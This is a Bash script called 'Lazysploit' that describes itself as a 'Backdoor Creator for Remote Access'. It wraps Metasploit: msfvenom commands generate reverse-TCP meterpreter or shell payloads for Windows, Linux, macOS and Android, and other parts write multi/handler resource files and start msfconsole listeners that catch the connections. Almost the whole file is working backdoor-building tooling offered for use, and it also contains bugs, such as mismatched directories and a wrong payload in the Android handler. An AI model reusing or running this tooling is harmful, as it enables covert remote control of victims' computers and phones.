#!/bin/bash

#Colour
orange='\e[38;5;166m'
BlueF='\e[1;34m'
cyan='\e[0;36m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
purple='\e[1;35m'
[[ `id -u` -eq 0 ]] || { echo -e $red "Must be root to run script"; exit 1; }
resize -s 30 88
#make the directory
mkdir ~/Desktop/output
clear
echo -e "Starting Services......."
service postgresql start

#exit funxtion
function escape() {
echo -e $cyan"Are you sure to Exit Lazysploit"
echo -ne $cyan"Choose y/n : "
read press
if test $press == 'Y'
then 
echo -e $red "Stopping Services......."
service postgresql stop
echo -e "Exit....."
tput sgr0
clear 
elif test $press == 'N'
then
menu
elif test $press == 'y'
then 
echo -e $red"Stopping Services......."
service postgresql stop
echo -e "Exit....."
tput sgr0
clear
elif test $press == 'n'
then
menu
fi
}

#banner
function windows() {
tput sgr0
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[] $blue __        ___           _                    $lightgreen[]"
echo -e $lightgreen"[] $blue \ \      / (_)_ __   __| | _____      _____  $lightgreen[]"
echo -e $lightgreen"[] $blue  \ \ /\ / /| | '_ \ / _| |/ _ \ \ /\ / / __| $lightgreen[]"
echo -e $lightgreen"[] $blue   \ V  V / | | | | | (_| | (_) \ V  V /\__ \ $lightgreen[]"
echo -e $lightgreen"[] $blue    \_/\_/  |_|_| |_|\__,_|\___/ \_/\_/ |___/ $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[]       $red Create a $sub for WINDOWS           $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
tput sgr0
}

#banner
function android(){
tput sgr0
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[] $blue     _              _           _     _       $lightgreen[]"
echo -e $lightgreen"[] $blue    / \   _ __   __| |_ __ ___ (_) __| |      $lightgreen[]"
echo -e $lightgreen"[] $blue   / _ \ | '_ \ / _' | '__/ _ \| |/ _' |      $lightgreen[]"
echo -e $lightgreen"[] $blue  / ___ \| | | | (_| | | | (_) | | (_| |      $lightgreen[]"
echo -e $lightgreen"[] $blue /_/   \_\_| |_|\__,_|_|  \___/|_|\__,_|      $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[]       $red Create a Payload for  ANDROID          $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
tput sgr0
}

#banner
function mac(){
tput sgr0
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[] $blue  __  __                                      $lightgreen[]"
echo -e $lightgreen"[] $blue |  \/  | __ _  ___                           $lightgreen[]"
echo -e $lightgreen"[] $blue | |\/| |/ _' |/ __|                          $lightgreen[]"
echo -e $lightgreen"[] $blue | |  | | (_| | (__                           $lightgreen[]"
echo -e $lightgreen"[] $blue |_|  |_|\__,_|\___|                          $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[]       $red Create a Payload for  MAC              $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
tput sgr0
}

#banner
function linux(){
tput sgr0
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[] $blue  _     _                                     $lightgreen[]"
echo -e $lightgreen"[] $blue | |   (_)_ __  _   ___  __                   $lightgreen[]"
echo -e $lightgreen"[] $blue | |   | | '_ \| | | \ \/ /                   $lightgreen[]"
echo -e $lightgreen"[] $blue | |___| | | | | |_| |>  <                    $lightgreen[]"
echo -e $lightgreen"[] $blue |_____|_|_| |_|\__,_/_/\_\                   $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
echo -e $lightgreen"[]       $red Create a Payload for LINUX             $lightgreen[]"
echo -e $lightgreen"[]===============================================[]"
tput sgr0
}

###################################################################
# MSFVWNOM MENU                                                   #
###################################################################
function creator() {
clear
tput sgr0
echo -e $lightgreen"  ======================================================================== "
echo -e " |  $cyan  Create Payload with msfvenom ( must install msfvenom )  $ligitgreen         | "
echo -e $lightgreen"  ======================================================================== "
echo -e $red"  ___________ "
echo -e " |           |======[***   $yellow    ____                _             "
echo -e $red" | $yellow MSFVENOM $red \ 	     $yellow / ___|_ __ ___  ____| |_ ___  _ __ "
echo -e $red" |_____________\_______    $yellow  | |   | '__/ _ \/ _  | __/ _ \| '__|"
echo -e $red" |==[     >]===========\   $yellow  | |___| | |  __/ (_| | || (_) | |   "
echo -e $red" |______________________\  $yellow   \____|_|  \___|\____|\__\___/|_|    "
echo -e $yellow"  \(@)(@)(@)(@)(@)(@)(@)/ "
echo -e $red"  *********************  "
echo -e "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "    $lightgreen[$red"1"$lightgreen] $white Windows       [laxysploit.exe] "
tput sgr0                               
echo -e "    $lightgreen[$red"2"$lightgreen] $white Linux         [lazysploit.elf] "
tput sgr0
echo -e "    $lightgreen[$red"3"$lightgreen] $white Mac           [lazysploit.macho] "
tput sgr0
echo -e "    $lightgreen[$red"4"$lightgreen] $white Android       [lazysploit.apk]"
tput sgr0
echo -e "    $lightgreen[$red"5"$lightgreen] $white List_All      [Start MSFConsole] "
tput sgr0
echo -e "    $lightgreen[$red"6"$lightgreen] $white Back          [Back From Menu] "
echo -e $lightgreen"┌─["$red"SOUMEN$lightgreen]──[$red~$lightgreen]─["$cyan"msfvenom$lightgreen]:"	
echo -ne $lightgreen"└─────► " ;tput sgr0

read options
 case "$options" in
    "1" | "1" )
     clear
     sub='payload'
     windows
     echo -e $white ""                                            
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
            echo -e "$yellow:::::$red shell.exe saved to ~/Desktop/temp$yellow:::::"
            echo -ne "Press [ENTER] key to return to menu ."
     read cont
     creator
            ;;
    "2" | "2" )
     clear
     linux
     echo -e $white "" 
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
            echo -e "$yellow:::::$red shell.elf saved to ~/Desktop/temp$yellow:::::"
            ;;
    "3" | "3" )
     clear
     mac
     echo -e $white "" 
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
            echo -e "$yellow:::::$red shell.macho saved to ~/Desktop/temp$yellow:::::"
            ;;
    "4" | "4" )
     clear
     android
     echo -e $white "" 
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
     echo -e "$yellow:::::$red shell.apk saved to ~/Desktop/temp$yellow:::::"
            ;;  
    "5" | "5" )
            xterm -e msvenom -l &
            ;;  
    "6" | "6" )
     menu 
            ;;
    *) 
     echo invalid option;;
 esac
}

###################################################################
# LISTNER MENU                                                    #
###################################################################
function listner() {
tput sgr0
clear
echo -e $lightgreen"[]==============================================[]"
echo -e $lightgreen"[] $blue  _     ___ ____ _____ _   _ _____ ____      $lightgreen[]"
echo -e $lightgreen"[] $blue | |   |_ _/ ___|_   _| \ | | ____|  _ \     $lightgreen[]"
echo -e $lightgreen"[] $blue | |    | |\___ \ | | |  \| |  _| | |_) |    $lightgreen[]"
echo -e $lightgreen"[] $blue | |___ | | ___) || | | |\  | |___|  _ <     $lightgreen[]"
echo -e $lightgreen"[] $blue |_____|___|____/ |_| |_| \_|_____|_| \_\    $lightgreen[]"
echo -e $lightgreen"[]                                              []"
echo -e $lightgreen"[]==============================================[]"
echo -e $lightgreen"[]   $red Lets Craft a Listner for Exploit          $lightgreen[]"
echo -e $lightgreen"[]==============================================[]"
tput sgr0
echo -e "    $red[$lightgreen"1"$red]$white Windows"
echo -e "    $red[$lightgreen"2"$red]$white Linux"
echo -e "    $red[$lightgreen"3"$red]$white Mac"
echo -e "    $red[$lightgreen"4"$red]$white Android"
echo -e "    $red[$lightgreen"5"$red]$white List_All"
echo -e "    $red[$lightgreen"6"$red]$white Back"
PS3='┌─[SOUMEN]─[creator]
└─────► '

read options
 case "$options" in
    "1" | "1" )
     clear
     sub='listner'
     windows
     echo -e $white ""                                             
            touch ~/Desktop/temp/meterpreter.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
            echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter.rc
            cat ~/Desktop/temp/meterpreter.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter.rc &
            echo -ne "Press [ENTER] key to return to menu ."
            read cont
            listner
            ;;
    "2" | "2" )
     clear
     linux
     echo -e $white "" 
            touch ~/Desktop/temp/meterpreter_linux.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter_linux.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_linux.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_linux.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_linux.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_linux.rc
            cat ~/Desktop/temp/meterpreter_linux.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_linux.rc &
            exit
            ;;
    "3" | "3" )
     clear
     mac
     echo -e $white "" 
            touch ~/Desktop/temp/meterpreter_mac.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_mac.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_mac.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_mac.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_mac.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_mac.rc
            cat ~/Desktop/temp/meterpreter_mac.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_mac.rc &
            ;;
    "4" | "4" ) 
     clear
     android
     echo -e $white "" 
            touch ~/Desktop/temp/meterpreter_droid.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_droid.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_droid.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_droid.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_droid.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_droid.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_droid.rc
            cat ~/Desktop/temp/meterpreter_droid.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_droid.rc &
            ;;  
    "5" | "5" )
            touch ~/Desktop/temp/payloads.rc
            echo show payloads > ~/Desktop/temp/payloads.rc
            cat ~/Desktop/temp/payloads.rc
            xterm -e msfconsole -r ~/Desktop/temp/payloads.rc &
            ;;   
    "6" | "6" )
     menu
            ;;
    *)
      echo invalid option
            ;;
 esac
}

###################################################################
# MENU FUNCTION                                                   #
###################################################################
function menu(){
clear
tput sgr0  
echo -e "  ╔═════════════════════════════════════════════════════════════════════════════════╗"
echo -e "  $white║  $red██$cyan╗      $red█████$cyan╗ $red███████$cyan╗$red██$cyan╗   $red██$cyan╗$red███████$cyan╗$red██████$cyan╗ $red██$cyan╗      $red██████$cyan╗ $red██$cyan╗$red████████$cyan╗ $white║"
echo -e "  $white║  $red██$cyan║     $red██$cyan╔══$red██$cyan╗╚══$red███$cyan╔╝╚$red██$cyan╗ $red██$cyan╔╝$red██$cyan╔════╝$red██$cyan╔══$red██$cyan╗$red██$cyan║     $red██$cyan╔═══$red██$cyan╗$red██$cyan║╚══$red██$cyan╔══╝ $white║"
echo -e "  $white║  $red██$cyan║     $red███████$cyan║  $red███$cyan╔╝  ╚$red████$cyan╔╝ $red███████$cyan╗$red██████$cyan╔╝$red██$cyan║     $red██$cyan║   $red██$cyan║$red██$cyan║   $red██$cyan║    $white║"
echo -e "  $white║  $red██$cyan║     $red██$cyan╔══$red██$cyan║ $red███$cyan╔╝    ╚$red██$cyan╔╝  ╚════$red██$cyan║$red██$cyan╔═══╝ $red██$cyan║     $red██$cyan║   $red██$cyan║$red██$cyan║   $red██$cyan║    $white║"
echo -e "  $white║  $red███████$cyan╗$red██$cyan║  $red██$cyan║$red███████$cyan╗   $red██$cyan║   $red███████$cyan║$red██$cyan║     $red███████$cyan╗╚$red██████$cyan╔╝$red██$cyan║   $red$red██$cyan║    $white║"
echo -e "  $white║  $cyan╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝    $white║"
echo -e "  $white╚═════════════════════════════════════════════════════════════════════════════════╝"
echo -e "                $white[$lightgreen--$white]    $white Backdoor Creator for Remote Access     $white[$lightgreen--$white] "
echo -e "                $white[$lightgreen--$white]         $cyan Created by:$red Soumen Khara          $white[$lightgreen--$white] "
echo -e "                $white[$lightgreen--$white]       $cyan Follow me on Github:$red @50UM3N        $white[$lightgreen--$white]"
echo -e "                $white[$lightgreen--$white]         $white SELECT AN OPTION TO BEGIN         $white[$lightgreen--$white]"
tput sgr0 
echo -e "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "    $lightgreen[$red"1"$lightgreen] $lightgreen Payload      $white [Create a payload with msvenom] "
tput sgr0                               
echo -e "    $lightgreen[$red"2"$lightgreen] $lightgreen Listen       $white [Start a multi handler] "
tput sgr0
echo -e "    $lightgreen[$red"3"$lightgreen] $lightgreen Exploit      $white [Start Msfconsole] "
tput sgr0
echo -e "    $lightgreen[$red"4"$lightgreen] $lightgreen Armitage     $white [Start Armitage GUI] "
tput sgr0
echo -e "    $lightgreen[$red"5"$lightgreen] $lightgreen Exit         $white [Exit from Lazysploit] "
echo -e $lightgreen"┌─["$red"SOUMEN$lightgreen]──[$red~$lightgreen]─[$cyan"menu"$lightgreen]:"  
echo -ne $lightgreen"└─────► " ;tput sgr0

read options
 case "$options" in
    "1" | "1" )
      creator
      ;;
    "2" | "2" )
      listner
      ;;
    "3" | "3" )
     echo -e "$red::::::::::::::::::::::::::::::::$white Starting Metasploit $red::::::::::::::::::::::::::::::::::"
      msfconsole
      use exploit/multi/handler  
      ;;
    "4" | "4" )
      echo -e "$red::::::::::::::::::::::::::::::::$white Armitage Launching $red::::::::::::::::::::::::::::::::::"
      echo "armitage should be in /opt/armitage"
      echo -e "$red::::::::::::::::::::::::::::::::::: $white Launching... $red::::::::::::::::::::::::::::::::::::::"
      xterm -e sudo java -jar /opt/armitage/armitage.jar & 
      ;;
    "5" | "5" )
      escape
      ;;
    * )
      echo -e invalide option
      ;; 
 esac
}

###################################################################
# MENU                                                            #
###################################################################
clear
tput sgr0  
echo -e "  ╔═════════════════════════════════════════════════════════════════════════════════╗"
echo -e "  $white║  $red██$cyan╗      $red█████$cyan╗ $red███████$cyan╗$red██$cyan╗   $red██$cyan╗$red███████$cyan╗$red██████$cyan╗ $red██$cyan╗      $red██████$cyan╗ $red██$cyan╗$red████████$cyan╗ $white║"
echo -e "  $white║  $red██$cyan║     $red██$cyan╔══$red██$cyan╗╚══$red███$cyan╔╝╚$red██$cyan╗ $red██$cyan╔╝$red██$cyan╔════╝$red██$cyan╔══$red██$cyan╗$red██$cyan║     $red██$cyan╔═══$red██$cyan╗$red██$cyan║╚══$red██$cyan╔══╝ $white║"
echo -e "  $white║  $red██$cyan║     $red███████$cyan║  $red███$cyan╔╝  ╚$red████$cyan╔╝ $red███████$cyan╗$red██████$cyan╔╝$red██$cyan║     $red██$cyan║   $red██$cyan║$red██$cyan║   $red██$cyan║    $white║"
echo -e "  $white║  $red██$cyan║     $red██$cyan╔══$red██$cyan║ $red███$cyan╔╝    ╚$red██$cyan╔╝  ╚════$red██$cyan║$red██$cyan╔═══╝ $red██$cyan║     $red██$cyan║   $red██$cyan║$red██$cyan║   $red██$cyan║    $white║"
echo -e "  $white║  $red███████$cyan╗$red██$cyan║  $red██$cyan║$red███████$cyan╗   $red██$cyan║   $red███████$cyan║$red██$cyan║     $red███████$cyan╗╚$red██████$cyan╔╝$red██$cyan║   $red$red██$cyan║    $white║"
echo -e "  $white║  $cyan╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝    $white║"
echo -e "  $white╚═════════════════════════════════════════════════════════════════════════════════╝"
echo -e "                $white[$lightgreen--$white]    $white Backdoor Creator for Remote Access     $white[$lightgreen--$white] "
echo -e "                $white[$lightgreen--$white]         $cyan Created by:$red Soumen Khara          $white[$lightgreen--$white] "
echo -e "                $white[$lightgreen--$white]       $cyan Follow me on Github:$red @50UM3N        $white[$lightgreen--$white]"
echo -e "                $white[$lightgreen--$white]         $white SELECT AN OPTION TO BEGIN         $white[$lightgreen--$white]"
tput sgr0 
echo -e "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "    $lightgreen[$red"1"$lightgreen] $lightgreen Payload      $white [Create a payload with msvenom] "
tput sgr0                               
echo -e "    $lightgreen[$red"2"$lightgreen] $lightgreen Listen       $white [Start a multi handler] "
tput sgr0
echo -e "    $lightgreen[$red"3"$lightgreen] $lightgreen Exploit      $white [Start Msfconsole] "
tput sgr0
echo -e "    $lightgreen[$red"4"$lightgreen] $lightgreen Armitage     $white [Start Armitage GUI] "
tput sgr0
echo -e "    $lightgreen[$red"5"$lightgreen] $lightgreen Exit         $white [Exit from Lazysploit] "
echo -e $lightgreen"┌─["$red"SOUMEN$lightgreen]──[$red~$lightgreen]─[$cyan"menu"$lightgreen]:"  
echo -ne $lightgreen"└─────► " ;tput sgr0

read options
 case "$options" in
    "1" | "1" )
      creator
      ;;
    "2" | "2" )
      listner
      ;;
    "3" | "3" )
     echo -e "$red::::::::::::::::::::::::::::::::$white Starting Metasploit $red::::::::::::::::::::::::::::::::::"
      msfconsole
      use exploit/multi/handler  
      ;;
    "4" | "4" )
      echo -e "$red::::::::::::::::::::::::::::::::$white Armitage Launching $red::::::::::::::::::::::::::::::::::"
      echo "armitage should be in /opt/armitage"
      echo -e "$red::::::::::::::::::::::::::::::::::: $white Launching... $red::::::::::::::::::::::::::::::::::::::"
      xterm -e sudo java -jar /opt/armitage/armitage.jar & 
      ;;
    "5" | "5" )
      escape
      ;;
    * )
      echo -e invalide option
      ;; 
 esac

